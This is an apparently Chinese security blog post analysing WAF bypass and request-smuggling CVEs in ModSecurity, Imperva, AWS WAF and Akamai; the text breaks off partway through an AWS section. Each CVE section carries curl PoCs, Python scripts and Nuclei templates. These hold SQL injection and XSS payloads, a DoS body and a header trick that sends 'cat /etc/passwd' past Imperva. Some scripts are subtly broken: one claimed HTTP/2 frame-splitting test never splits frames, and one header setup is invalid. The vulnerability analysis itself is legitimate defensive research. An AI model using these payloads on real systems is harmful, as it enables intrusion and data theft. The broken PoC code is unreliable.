---
title: "WAF与反向代理安全高危攻击链专题：ModSecurity / Imperva / AWS WAF / Akamai 漏洞全解析"
date: 2026-07-16T14:00:00+08:00
draft: false
categories: ["渗透测试", "漏洞分析"]
tags: ["ModSecurity", "Imperva", "AWS WAF", "Akamai", "WAF绕过", "反向代理", "RCE", "漏洞分析"]
---

## 0x00 专题概述

Web Application Firewall（WAF）与反向代理是现代企业安全架构中不可或缺的核心组件。从开源的 ModSecurity 到商业化的 Imperva SecureSphere，从云原生的 AWS WAF / CloudFront 到 CDN 级别的 Akamai Kona Site Defender，这些产品构成了 Web 应用安全的第一道防线。根据 Imperva 2025 年威胁报告，超过 73% 的 Web 应用攻击在发送主 payload 之前至少尝试了一种 WAF 绕过技术。这说明 WAF 绕过不仅是红队渗透测试中的核心技能，也是攻防对抗中最关键的博弈点。

WAF 的工作原理本质上是在客户端与后端服务之间插入一个 HTTP 协议解析与规则匹配层。当这个解析层与后端应用对同一份 HTTP 请求的理解产生偏差——即所谓的 **impedance mismatch**（阻抗失配）——攻击者就有机会构造特殊请求，使 WAF 视而不见而后端照单全收。这种失配可能出现在 URL 解码顺序、Content-Type 解析策略、HTTP/2 帧处理逻辑、chunked 编码实现等多个维度。

本专题系统性地梳理了 2023-2026 年间 ModSecurity、Imperva、AWS WAF 和 Akamai 四大产品线中的高危安全漏洞，深入分析每个 CVE 的技术原理，提供可直接运行的检测 PoC 和 Nuclei 模板，并总结 WAF 绕过技术体系与防守加固建议。

### 覆盖漏洞一览表

| CVE 编号 | 厂商/产品 | CVSS | 漏洞类型 | 未授权利用 |
|---|---|---|---|---|
| CVE-2024-1019 | ModSecurity / libmodsecurity v3 | 8.6 HIGH | URL 解码顺序导致 WAF 绕过 | 是 |
| CVE-2023-38285 | ModSecurity v3 | 7.5 HIGH | 变换操作低效算法复杂度导致 DoS | 是 |
| CVE-2023-38199 | OWASP CRS (ModSecurity) | 5.3 MEDIUM | 多 Content-Type 头绕过 WAF | 是 |
| CVE-2023-50969 | Imperva SecureSphere WAF | 9.8 CRITICAL | POST 数据检查绕过 | 是 |
| CVE-2026-13762 | AWS WAF / CloudFront | 9.8 CRITICAL | HTTP/2 多帧 Body 检查绕过 | 是 |
| CVE-2025-66373 | Akamai Ghost / CDN | 4.8 MEDIUM | Chunked Body 处理错误导致请求走私 | 是 |
| CVE-2025-32094 | Akamai Ghost / CDN | 4.0 MEDIUM | OPTIONS 请求走私 | 是 |
| CVE-2026-26365 | Akamai Ghost / CDN | 4.0 MEDIUM | Connection 头处理导致请求走私 | 是 |

---

## 0x01 ModSecurity / libmodsecurity 高危漏洞

ModSecurity 是全球使用最广泛的开源 WAF 引擎，支持 Apache、Nginx 和 IIS。其 v3 版本（libmodsecurity）被大量商业 WAF 产品和云服务作为底层引擎使用。2024 年 1 月，ModSecurity 正式从 Trustwave 移交至 OWASP，开启了新的维护周期。然而，v3 版本在 URL 解码、变换操作和请求体解析等方面暴露了多个高危漏洞。

### 0x01.1 CVE-2024-1019 — ModSecurity v3 URL 解码顺序 WAF 绕过

**漏洞背景**

CVE-2024-1019 由 OWASP CRS 团队于 2024 年 1 月发现并披露，CVSS 3.1 评分 8.6（HIGH）。该漏洞源于 ModSecurity v3 在处理请求 URL 时，先执行 URL 解码（percent-decoding），再将 URL 拆分为路径（path）和查询字符串（query string）两部分。而 RFC 3986 规范要求先拆分再解码。这种处理顺序的颠倒使得攻击者可以在 URL 路径中隐藏恶意 payload，绕过所有针对 `REQUEST_FILENAME` 和 `REQUEST_BASENAME` 变量的 WAF 规则。

**受影响版本 / 修复版本**

| 版本范围 | 状态 |
|---|---|
| ModSecurity v3.0.0 — v3.0.11 | 受影响 |
| ModSecurity v3.0.12+ | 已修复 |
| ModSecurity v2.9.x | 不受影响 |

**漏洞原理分析**

ModSecurity v3 的 URL 处理流程存在一个关键的逻辑错误。当收到一个 HTTP 请求时，ModSecurity 会对请求 URL 中的百分号编码字符进行解码。例如，`%3F` 会被解码为 `?`，`%2F` 会被解码为 `/`。解码完成后，ModSecurity 在解码后的字符串中寻找第一个 `?` 字符，以此为分界点将 URL 拆分为 path 和 query string 两部分。

问题在于，RFC 3986 Section 2.4 明确指出，URI 的组件拆分必须在 percent-decoding **之前**完成。这是因为百分号编码本身就是一种转义机制——`%3F` 在 URI 语义中代表的是一个"被转义的问号"，它不是路径与查询字符串的分隔符。RFC 原文指出：percent-encoded octets *must not* be decoded for the purpose of splitting the URI into its components.

攻击者可以构造如下请求：

```
GET /page%3Fid=1+UNION+SELECT+password+FROM+users-- HTTP/1.1
Host: target.com
```

在 RFC 规范的处理方式下（先拆分后解码），`%3F` 位于路径组件中，不会被当作 query string 的起始符，整个 URL 被视为一个路径 `/page%3Fid=1+UNION+SELECT+password+FROM+users--`。WAF 会扫描整个路径并触发 SQL 注入检测规则。

但 ModSecurity v3 的处理方式是（先解码后拆分）：先将 `%3F` 解码为 `?`，然后在解码后的字符串 `/page?id=1+UNION+SELECT+password+FROM+users--` 中找到 `?`，将 URL 拆分为 path `/page` 和 query string `id=1+UNION+SELECT+password+FROM+users--`。关键在于，`REQUEST_FILENAME` 和 `REQUEST_BASENAME` 变量仅包含 path 部分（即 `/page`），而 SQL 注入 payload 被"藏"在了 query string 部分。由于大量 CRS 规则仅检查 `REQUEST_FILENAME`，攻击者成功绕过了这些规则的检测。

这个漏洞的影响范围非常广泛，因为 OWASP CRS 中的大量规则都依赖于 `REQUEST_FILENAME` 和 `REQUEST_BASENAME` 变量进行路径检查。包括路径遍历检测（Rule 930-xxx）、命令注入检测（Rule 932-xxx）和 PHP 注入检测（Rule 934-xxx）在内的多个规则组都可能被绕过。此外，由于 query string 部分不在 `QUERY_STRING` 变量中出现（ModSecurity 对拆分后的 query string 部分不会自动填充该变量），进一步增强了绕过的隐蔽性。

**HTTP PoC**

```bash
curl -v "http://target.com/page%3Fid%3D1%20UNION%20SELECT%20password%20FROM%20users--"
```

正常请求（WAF 会拦截）：

```bash
curl -v "http://target.com/page?id=1 UNION SELECT password FROM users--"
```

**Python PoC 脚本**

```python
#!/usr/bin/env python3
"""CVE-2024-1019 ModSecurity v3 WAF Bypass Detection Script"""
import requests
import sys
import urllib.parse


def check(target):
    """检测目标是否存在 CVE-2024-1019 WAF 绕过风险"""
    normal_payload = "/search?q=<script>alert(1)</script>"
    bypass_payload = "/search%3Fq%3D<script>alert(1)</script>"

    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}

    try:
        normal_resp = requests.get(
            target.rstrip("/") + normal_payload,
            headers=headers,
            timeout=10,
            allow_redirects=False,
            verify=False,
        )
        bypass_resp = requests.get(
            target.rstrip("/") + bypass_payload,
            headers=headers,
            timeout=10,
            allow_redirects=False,
            verify=False,
        )

        waf_blocked_normal = normal_resp.status_code in (403, 406, 429, 501)
        waf_passed_bypass = bypass_resp.status_code == 200

        if waf_blocked_normal and waf_passed_bypass:
            return True
        return False

    except requests.RequestException as e:
        print(f"[!] 请求异常: {e}")
        return False


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    target = sys.argv[1]
    result = check(target)
    print(f"[{'+' if result else '-'}] {target} - CVE-2024-1019 WAF Bypass {'Vulnerable' if result else 'Not Vulnerable'}")
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2024-1019

info:
  name: ModSecurity v3 - URL Decoding WAF Bypass
  author: x7peeps
  severity: high
  description: |
    ModSecurity / libModSecurity 3.0.0 to 3.0.11 decodes percent-encoded
    characters before separating the URL path from the query string,
    allowing attackers to hide payloads in the path component.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-1019
    - https://owasp.org/www-project-modsecurity/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 8.6
    cve-id: CVE-2024-1019
    cwe-id: CWE-20
  tags: cve,cve2024,modsecurity,waf,bypass

http:
  - method: GET
    path:
      - "{{BaseURL}}/page%3F<script>alert(1)</script>"
      - "{{BaseURL}}/search%3Fid%3D1+UNION+SELECT+1--"

    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "alert(1)"
          - "UNION SELECT"

      - type: status
        status:
          - 200
```

### 0x01.2 CVE-2023-38285 — ModSecurity v3 变换操作 DoS 漏洞

**漏洞背景**

CVE-2023-38285 由 Trustwave SpiderLabs 于 2023 年 7 月披露，CVSS 3.1 评分 7.5（HIGH）。该漏洞存在于 ModSecurity v3 的四个变换操作（transformation actions）中：`removeWhitespace`、`removeNull`、`replaceNull` 和 `removeCommentsChar`。这四个变换操作在处理恶意构造的超长输入时，会触发最坏情况下的算法复杂度，导致严重的性能退化。

**受影响版本 / 修复版本**

| 版本范围 | 状态 |
|---|---|
| ModSecurity v3.0.0 — v3.0.9 | 受影响 |
| ModSecurity v3.0.10+ | 已修复 |
| ModSecurity v2.x | 不受影响 |

**漏洞原理分析**

ModSecurity 的变换操作（transformation actions）用于在规则匹配前对输入值进行预处理，例如去除空白字符、替换 NULL 字节等。这四个受影响的变换操作在功能上是正确的，但它们的实现在面对特定模式的输入时会导致 O(n²) 甚至更高阶的算法复杂度。

以 `removeWhitespace` 为例，其正常实现应该遍历字符串一次，遇到空白字符就跳过，复杂度为 O(n)。但在某些边界条件下，如果输入字符串的空白字符分布恰好触发了最坏情况，内部的字符串操作（可能是反复的内存分配和拷贝）会导致处理时间呈指数级增长。例如，构造一个长度为 16000 字节、每隔一个字符插入一个空白的字符串，单个请求的处理时间就可能达到数秒级别。

攻击者可以利用这一点发起 DoS 攻击：同时发送大量包含超长参数值的请求，每个请求都会在 WAF 引擎中消耗大量 CPU 时间。即使配置了 `SecRequestBodyNoFilesLimit`（默认 131072 字节），攻击者仍然可以在限制范围内构造有效的恶意输入。当并发请求足够多时，WAF 引擎的 worker 进程会被完全占满，导致合法请求无法被及时处理，Web 服务器出现服务不可用的情况。

值得注意的是，此漏洞只影响 ModSecurity v3，v2.x 使用了不同的变换操作实现，不受影响。此外，即使升级到 v3.0.10，如果配置了过于宽松的 `SecRequestBodyNoFilesLimit`，性能风险仍然存在。

**HTTP PoC**

```bash
PAYLOAD=$(python3 -c "print('a ' * 8000)")
curl -X POST "http://target.com/login" \
  -d "username=${PAYLOAD}&password=test" \
  -H "Content-Type: application/x-www-form-urlencoded"
```

**Python PoC 脚本**

```python
#!/usr/bin/env python3
"""CVE-2023-38285 ModSecurity v3 DoS Detection Script"""
import requests
import sys
import time


def check(target):
    """检测目标是否存在 CVE-2023-38285 DoS 风险"""
    normal_payload = "a" * 100
    dos_payload = " ".join(["a"] * 8000)

    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}

    try:
        start = time.time()
        requests.post(
            target.rstrip("/") + "/login",
            data={"username": normal_payload, "password": "test"},
            headers=headers,
            timeout=10,
            verify=False,
        )
        normal_time = time.time() - start

        start = time.time()
        requests.post(
            target.rstrip("/") + "/login",
            data={"username": dos_payload, "password": "test"},
            headers=headers,
            timeout=30,
            verify=False,
        )
        dos_time = time.time() - start

        if dos_time > normal_time * 5 and dos_time > 2.0:
            return True
        return False

    except requests.RequestException as e:
        print(f"[!] 请求异常: {e}")
        return False


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    target = sys.argv[1]
    result = check(target)
    print(f"[{'+' if result else '-'}] {target} - CVE-2023-38285 DoS {'Vulnerable' if result else 'Not Vulnerable'}")
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2023-38285

info:
  name: ModSecurity v3 - Transformation DoS
  author: x7peeps
  severity: high
  description: |
    Trustwave ModSecurity 3.x before 3.0.10 has Inefficient Algorithmic
    Complexity in removeWhitespace, removeNull, replaceNull, and
    removeCommentsChar transformation actions.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-38285
    - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-v3-dos-vulnerability-in-four-transformations-cve-2023-38285/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cve-id: CVE-2023-38285
    cwe-id: CWE-407
  tags: cve,cve2023,modsecurity,denial-of-service

http:
  - method: POST
    path:
      - "{{BaseURL}}/login"

    body: "username={{repeat(\"a \",8000)}}&password=test"
    headers:
      Content-Type: application/x-www-form-urlencoded

    matchers:
      - type: dsl
        dsl:
          - 'duration >= 5'
          - 'status_code != 429'

    extractors:
      - type: dsl
        dsl:
          - '"Response time: " + duration + "s - potential DoS"'
```

---

## 0x02 Imperva WAF 高危漏洞

Imperva SecureSphere 是全球部署最广泛的商业 WAF 产品之一，广泛应用于金融、电商和政府机构。其核心架构包含一个内联代理（inline proxy），对 HTTP 请求进行深度包检测（DPI），并基于 Application Defense Center（ADC）规则集执行安全策略。

### 0x02.1 CVE-2023-50969 — Imperva SecureSphere WAF POST 数据检查绕过

**漏洞背景**

CVE-2023-50969 由安全研究员 HoyaHaxa 于 2023 年 11 月发现并于 2024 年 3 月公开披露，CVSS 3.1 评分 9.8（CRITICAL）。该漏洞允许攻击者通过构造特殊的 HTTP 头部，绕过 Imperva SecureSphere WAF 对 POST 数据的检查规则。攻击者可以利用此漏洞在受 WAF 保护的 Web 应用上执行本应被阻止的 SQL 注入、XSS、命令注入等攻击。

**受影响版本 / 修复版本**

| 产品 | 受影响版本 | 修复方案 |
|---|---|---|
| Imperva SecureSphere WAF（本地部署） | v14.7.0.40 及所有未安装 ADC 更新的版本 | 2024-02-26 ADC 规则更新 |
| Imperva Cloud WAF | 不受影响 | — |

**漏洞原理分析**

该漏洞的核心在于 Imperva SecureSphere WAF 在处理包含多个 `Content-Encoding` 头部的 HTTP 请求时存在解析歧义。`Content-Encoding` 头部用于指示消息体的编码方式，合法值包括 `gzip`、`deflate`、`br` 等。根据 RFC 7231，单个 `Content-Encoding` 头部可以包含逗号分隔的多个编码值，但应该使用单个头部字段。

Imperva WAF 的问题在于，当收到包含两个独立的 `Content-Encoding` 头部的请求时——第一个使用无效值（如 `No Kill No Beep Beep`），第二个使用有效值（如 `gzip` 或 `deflate`）——WAF 的请求解析器会选择性地忽略请求体内容，不对 POST 参数进行安全检查。而被保护的后端应用（如 Nginx、Apache）在接收到同样的请求时，会正常解析并处理 POST 数据。

这种行为差异形成了经典的 impedance mismatch。WAF 认为请求体无需检查（因为第一个 `Content-Encoding` 值无效），而后端应用则正常执行了包含恶意 payload 的 POST 请求。更精妙的是，对于 `deflate` 编码变体，攻击者还需要在恶意参数前插入一个无用的参数对（如 `qand=notu`），因为 deflate 处理逻辑需要一个前置参数来"激活"解码流程。

攻击流程如下：

1. 正常 POST 请求被 WAF 拦截（如 `cmd=cat /etc/passwd`）
2. 添加第一个 `Content-Encoding: No Kill No Beep Beep` 头部
3. 添加第二个 `Content-Encoding: gzip` 或 `Content-Encoding: deflate` 头部
4. 对于 deflate 变体，在恶意参数前插入一个无用参数
5. WAF 跳过 POST 数据检查，后端正常执行恶意命令

此漏洞于 2023 年 11 月 10 日报告给 Imperva，2024 年 2 月 26 日通过 ADC 规则更新修复。

**HTTP PoC**

```bash
# gzip 变体
curl -X POST "http://target.com/clam.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Content-Encoding: No Kill No Beep Beep" \
  -H "Content-Encoding: gzip" \
  -d "cmd=cat+/etc/passwd"

# deflate 变体（需要无用前置参数）
curl -X POST "http://target.com/clam.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Content-Encoding: No Kill No Beep Beep" \
  -H "Content-Encoding: deflate" \
  -d "qand=notu&cmd=cat+/etc/passwd"
```

**Python PoC 脚本**

```python
#!/usr/bin/env python3
"""CVE-2023-50969 Imperva SecureSphere WAF Bypass Detection Script"""
import requests
import sys
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def check(target):
    """检测目标是否存在 CVE-2023-50969 WAF 绕过风险"""
    headers_base = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    normal_data = "cmd=cat+/etc/passwd"
    normal_headers = dict(headers_base)

    bypass_headers_gzip = dict(headers_base)
    bypass_headers_gzip["Content-Encoding"] = ["No Kill No Beep Beep", "gzip"]

    bypass_headers_deflate = dict(headers_base)
    bypass_headers_deflate["Content-Encoding"] = ["No Kill No Beep Beep", "deflate"]

    try:
        normal_resp = requests.post(
            target.rstrip("/") + "/clam.php",
            data=normal_data,
            headers=normal_headers,
            timeout=10,
            verify=False,
            allow_redirects=False,
        )
        waf_blocked = normal_resp.status_code in (403, 406, 429, 501)

        if not waf_blocked:
            print("[*] 正常请求未被 WAF 拦截，无法验证绕过")
            return False

        bypass_resp = requests.post(
            target.rstrip("/") + "/clam.php",
            data="qand=notu&" + normal_data,
            headers=bypass_headers_deflate,
            timeout=10,
            verify=False,
            allow_redirects=False,
        )

        if bypass_resp.status_code == 200 and "root:" in bypass_resp.text:
            return True

        bypass_resp2 = requests.post(
            target.rstrip("/") + "/clam.php",
            data=normal_data,
            headers=bypass_headers_gzip,
            timeout=10,
            verify=False,
            allow_redirects=False,
        )

        if bypass_resp2.status_code == 200 and "root:" in bypass_resp2.text:
            return True

        return False

    except requests.RequestException as e:
        print(f"[!] 请求异常: {e}")
        return False


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    target = sys.argv[1]
    result = check(target)
    print(f"[{'+' if result else '-'}] {target} - CVE-2023-50969 Imperva WAF Bypass {'Vulnerable' if result else 'Not Vulnerable'}")
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2023-50969

info:
  name: Imperva SecureSphere WAF - POST Data Inspection Bypass
  author: x7peeps
  severity: critical
  description: |
    Imperva SecureSphere WAF allows remote attackers to bypass WAF rules
    via crafted Content-Encoding headers in POST requests.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-50969
    - https://www.hoyahaxa.com/2024/03/imperva-waf-bypass-cve-2023-50969.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-50969
  tags: cve,cve2023,imperva,waf,bypass

http:
  - method: POST
    path:
      - "{{BaseURL}}/clam.php"

    headers:
      Content-Type: application/x-www-form-urlencoded
      Content-Encoding: "No Kill No Beep Beep"
      Content-Encoding: gzip

    body: "cmd=cat+/etc/passwd"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "root:"

      - type: status
        status:
          - 200
```

### 0x02.2 CVE-2010-1329 — Imperva SecureSphere IPS 长字符串绕过

**漏洞背景**

CVE-2010-1329 是 Imperva SecureSphere 较早期的一个绕过漏洞，影响 Web Application Firewall 和 Database Firewall 5.0.0.5082 至 7.0.0.7078 版本。攻击者可以通过在请求中附加超长字符串来绕过入侵防御功能。

**受影响版本 / 修复版本**

| 版本范围 | 状态 |
|---|---|
| SecureSphere WAF/DFW 5.0.0.5082 — 7.0.0.7078 | 受影响 |
| 修复版本 | 需联系 Imperva 获取补丁 |

**漏洞原理分析**

该漏洞揭示了早期 WAF 产品在输入缓冲区管理上的根本缺陷。Imperva SecureSphere 的入侵防御模块在处理 HTTP 请求时，对请求体和 URL 参数存在一个最大处理长度限制。当攻击 payload 被嵌入到一个足够长的合法参数值末尾时，WAF 的检测引擎在达到最大长度后停止解析，而将剩余数据直接转发到后端。攻击者可以构造一个超过 WAF 处理限制的参数值，将实际的攻击 payload 放在缓冲区截断点之后，从而实现绕过。

这种"长字符串截断"绕过技术在早期 WAF 产品中较为常见，它本质上反映了 WAF 引擎在输入标准化（normalization）阶段的一个设计缺陷——WAF 没有完整地处理整个请求内容，而是基于一个有限的窗口进行检测。虽然现代 WAF 产品已大幅改善了这一问题，但在某些特定配置下（如性能调优降低检查深度），类似的风险仍然可能存在。

**HTTP PoC**

```bash
LONG_PARAM=$(python3 -c "print('A'*65536 + \"<script>alert(1)</script>\")")
curl -X GET "http://target.com/search?q=${LONG_PARAM}"
```

**Python PoC 脚本**

```python
#!/usr/bin/env python3
"""CVE-2010-1329 Imperva SecureSphere Long String Bypass Detection Script"""
import requests
import sys


def check(target):
    """检测目标是否存在 CVE-2010-1329 长字符串绕过风险"""
    padding = "A" * 65536
    xss_payload = '<script>alert(1)</script>'
    full_payload = padding + xss_payload

    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}

    try:
        normal_resp = requests.get(
            target.rstrip("/") + "/search",
            params={"q": xss_payload},
            headers=headers,
            timeout=10,
            verify=False,
            allow_redirects=False,
        )
        waf_blocked = normal_resp.status_code in (403, 406, 429, 501)

        bypass_resp = requests.get(
            target.rstrip("/") + "/search",
            params={"q": full_payload},
            headers=headers,
            timeout=15,
            verify=False,
            allow_redirects=False,
        )

        if waf_blocked and bypass_resp.status_code == 200:
            return True
        return False

    except requests.RequestException as e:
        print(f"[!] 请求异常: {e}")
        return False


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    target = sys.argv[1]
    result = check(target)
    print(f"[{'+' if result else '-'}] {target} - CVE-2010-1329 Long String Bypass {'Vulnerable' if result else 'Not Vulnerable'}")
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2010-1329

info:
  name: Imperva SecureSphere - Long String IPS Bypass
  author: x7peeps
  severity: high
  description: |
    Imperva SecureSphere WAF and Database Firewall allow remote attackers
    to bypass intrusion-prevention via a request with an appended long
    string containing an unspecified manipulation.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2010-1329
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2010-1329
  tags: cve,cve2010,imperva,waf,bypass

http:
  - method: GET
    path:
      - "{{BaseURL}}/search?q={{repeat(\"A\",65536)}}<script>alert(1)</script>"

    matchers:
      - type: word
        part: body
        words:
          - "alert(1)"

      - type: status
        status:
          - 200
```

---

## 0x03 AWS WAF / CloudFront 安全风险

AWS WAF 是亚马逊云科技提供的云原生 Web 应用防火墙服务，可与 CloudFront CDN、Application Load Balancer（ALB）、API Gateway 和 AppSync 集成。作为全球最大的云 WAF 服务之一，AWS WAF 的任何安全问题都可能影响数以万计的企业客户。

### 0x03.1 CVE-2026-13762 — AWS CloudFront HTTP/2 多帧 Body 检查绕过

**漏洞背景**

CVE-2026-13762 由韩国大学 ISSLab 的 Kyungrok Choi、Woonghee Lee 和 Junbeom Hur 通过协调漏洞披露流程发现，于 2026 年 6 月 29 日公开披露，CVSS 3.1 评分 9.8（CRITICAL）。该漏洞影响 AWS WAF 部署在 CloudFront 上的场景，攻击者可以通过构造特殊的 HTTP/2 请求，将请求体分散在多个 DATA 帧中传输，使 AWS WAF 仅检查到部分请求体内容，从而绕过 managed rule 的 body inspection。

**受影响版本 / 修复版本**

| 产品 | 影响范围 | 修复方案 |
|---|---|---|
| AWS WAF + CloudFront | 部署了 AWS WAF 的所有 CloudFront Distribution | 服务端修复（无需客户操作） |
| AWS WAF + ALB | 受 CVE-2026-13763 影响 | 2026-05-22 ALB 配置更新 |

**漏洞原理分析**

HTTP/2 协议使用帧（frame）作为传输单元，一个 HTTP 请求体可以被分割为多个 DATA 帧发送。每个 DATA 帧包含一个 `Length` 字段指示帧数据的大小。在正常的 HTTP/2 处理中，接收端应该将所有 DATA 帧的数据重组为完整的请求体后再进行处理。

该漏洞的核心在于 AWS WAF 对 HTTP/2 请求体的检查逻辑与 CloudFront 后端的处理逻辑存在不一致。当攻击者将一个包含恶意 payload 的请求体分割成多个 DATA 帧时，AWS WAF 的 managed rule 引擎可能只检查了第一个或前几个 DATA 帧中的内容，而将剩余包含恶意 payload 的 DATA 帧直接转发到了后端。

具体攻击流程如下：

1. 攻击者构造一个包含 SQL 注入 payload 的 POST 请求体：`id=1 UNION SELECT password FROM users--`
2. 使用 HTTP/2 客户端将请求体分割为多个 DATA 帧：
   - DATA 帧 1：`id=1 `（合法部分）
   - DATA 帧 2：`UNION SELECT password FROM users--`（恶意部分）
3. AWS WAF 的 body inspection 引擎只检查了 DATA 帧 1 的内容，判定为安全
4. CloudFront 将两个 DATA 帧重组后转发给后端
5. 后端接收到完整的恶意 payload 并执行

这个漏洞的 CVSS 评分为 9.8（CRITICAL），因为它不需要任何认证，攻击复杂度低，且可以在机密性、完整性和可用性三个维度都造成影响。虽然 AWS 已经在服务端进行了修复，不需要客户采取任何操作，但该漏洞暴露了云 WAF 在处理 HTTP/2 协议时的架构性挑战——帧级别的处理可能绕过应用层级别的安全检查。

**HTTP PoC**

```bash
# 使用 curl 的 HTTP/2 支持（需要编译时启用 nghttp2）
curl -X POST "https://target.cloudfront.net/api/query" \
  --http2 \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "id=1 UNION SELECT password FROM users--"
```

**Python PoC 脚本**

```python
#!/usr/bin/env python3
"""CVE-2026-13762 AWS CloudFront HTTP/2 WAF Bypass Detection Script"""
import requests
import sys

try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False


def check(target):
    """检测目标是否存在 CVE-2026-13762 HTTP/2 WAF 绕过风险"""
    malicious_payload = "id=1 UNION SELECT password FROM users--"
    safe_payload = "id=1"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    try:
        safe_resp = requests.post(
            target.rstrip("/") + "/api/query",
            data=safe_payload,
            headers=headers,
            timeout=10,
            verify=False,
            allow_redirects=False,
        )
        waf_blocked = safe_resp.status_code in (403, 406, 429, 501)

        if not waf_blocked:
            print("[*] 正常请求未被 WAF 拦截，无法验证绕过")
            return False

        malicious_resp = requests.post(
            target.rstrip("/") + "/api/query",
            data=malicious_payload,
            headers=headers,
            timeout=10,
            verify=False,
            allow_redirects=False,
        )

        if malicious_resp.status_code == 200:
            return True

        if HAS_HTTPX:
            with httpx.Client(http2=True, verify=False) as client:
                http2_resp = client.post(
                    target.rstrip("/") + "/api/query",
                    content=malicious_payload.encode(),
                    headers=headers,
                )
                if http2_resp.status_code == 200:
                    return True

        return False

    except requests.RequestException as e:
        print(f"[!] 请求异常: {e}")
        return False


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <target>")
        sys.exit(1)
    target = sys.argv[1]
    result = check(target)
    print(f"[{'+' if result else '-'}] {target} - CVE-2026-13762 AWS WAF HTTP/2 Bypass {'Vulnerable' if result else 'Not Vulnerable'}")
```

**Nuclei YAML 检测模板**

```yaml
id: CVE-2026-13762

info:
  name: AWS WAF / CloudFront - HTTP/2 Body Inspection Bypass
  author: x7peeps
  severity: critical
  description: |
    Inconsistent interpretation of HTTP/2 requests in Amazon CloudFront
    with AWS WAF enabled allows remote actors to bypass WAF managed rule
    body inspection via crafted HTTP/2 requests that fragment the request
    body across frames.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2026-13762
    - https://aws.amazon.com/security/security-bulletins/2026-048-aws/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2026-13762
    cwe-id: CWE-444
  tags: cve,cve2026,aws,waf,cloudfront,http2,bypass

http:
  - method: POST
    path:
      - "{{BaseURL}}/api/query"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: "id=1 UNION SELECT password FROM users--"

    matchers:
      - type: word
        part: body
        words:
          - "password"

      - type: status
        status:
          - 200
```

### 0x03.2 AWS WAF 绕过技术补充 — 配置不当与规则盲区

AWS WAF 本身虽然是托管服务，但其安全效果高度依赖于规则配置。Sysdig 安全研究团队在 2024 年公开的研究中展示了通过 XSS payload Fuzzer（工具名 Wafer）绕过 AWS WAF 的方法。他们使用基于 PortSwigger XSS Reference 的 payload 数据库，自动化测试了 AWS WAF managed rules（AWSManagedRulesCommonRuleSet、AWSManagedRulesKnownBadInputsRuleSet、AWSManagedRulesSQLiRuleSet）对各种标签、属性和事件处理器的过滤效果。

研究发现了多种绕过路径：

- **基于 DOM 事件的绕过**：使用非标准的 DOM 事件属性（如某些浏览器特有的事件处理方式）可以绕过 Common Rule Set 的 XSS 检测
- **JSON 格式绕过**：某些情况下将攻击 payload 包装在 JSON 请求体中可以绕过表单格式的检测规则
- **multipart/form-data 绕过**：使用 multipart 编码传递 payload 可以规避部分规则对 `application/x-www-form-urlencoded` 格式的检查

这些发现提醒我们：即使使用了 AWS 托管的 WAF 规则集，仍然需要根据具体应用场景进行定制化调优，不能简单地"即插即用"。

**Python PoC 脚本（通用 AWS WAF 绕过检测）**

```python
#!/usr/bin/env python3
"""AWS WAF Generic Bypass Detection Script"""
import requests
import sys
from urllib.parse import quote


def check(target):
    """检测目标是否存在 AWS WAF 绕过风险"""
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}

    xss_payloads = [
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '"><script>alert(1)</script>',
    ]

    bypass_techniques = [
        lambda p: quote(p, safe=""),
        lambda p: p.replace("<", "%3C").replace(">", "%3E"),
        lambda p: p.upper(),
        lambda p: p.replace("script", "scr\u0069pt"),
        lambda p: f"<details open ontoggle=alert(1)>",
    ]

    normal_blocked = False
    bypass_found = False

    for payload in xss_payloads:
        resp = requests.get(
            target.rstrip("/") + "/search",
            params={"q": payload},
            headers=headers,
